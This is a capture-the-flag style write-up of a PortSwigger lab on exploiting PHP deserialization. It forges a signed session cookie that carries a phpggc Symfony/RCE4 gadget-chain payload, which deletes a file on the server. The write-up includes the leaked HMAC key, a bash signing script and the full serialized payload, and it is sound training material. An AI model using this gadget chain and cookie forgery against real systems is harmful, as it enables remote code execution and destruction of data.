# [Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

## Lab

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

url-decoded session:

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJhMDEybDFsdTZ4MHBhOXF6djI2dmQycWl4a24yazFheiI7fQ==","sig_hmac_sha1":"c16437650260351a8fbaf91612a47a335051e62c"}
```

base64 decoded token:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"a012l1lu6x0pa9qzv26vd2qixkn2k1az";}
```

dev comment:

```html
  <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

- secret key: `pyvlelzjky8ysw99sjhmb0nlnijyer8x`
- Zend Engine v3.4.0

error when i'm trying to modify the session:

```html
h4>Internal Server Error: Symfony Version: 4.3.6</h4>
                    <p class=is-warning>PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
```

## Solutions

using tool: `phpggc`

list chains:

```bash
┌──(kali㉿kali)-[~]
└─$ phpggc -l
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                          RCE (Function call)    __destruct     *
```

shell script to generate payload:

```bash
#! /bin/bash

malicious_token=$(phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt' | base64 -w 0)
secret_key="pyvlelzjky8ysw99sjhmb0nlnijyer8x"
output=$(echo -n $malicious_token|openssl sha1 -hmac $secret_key) # SHA1(stdin)= 205c271ee93e2237c69847160252d89e4f9508d6 
signature=$(echo -n $output|cut -d" " -f2)

echo "{\"token\":\"$malicious_token\",\"sig_hmac_sha1\":\"$signature\"}"
```

output:

```bash
┌──(kali㉿kali)-[~]
└─$ ./script.sh     
{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K","sig_hmac_sha1":"205c271ee93e2237c69847160252d89e4f9508d6"}
```

url encode and send to server: solved
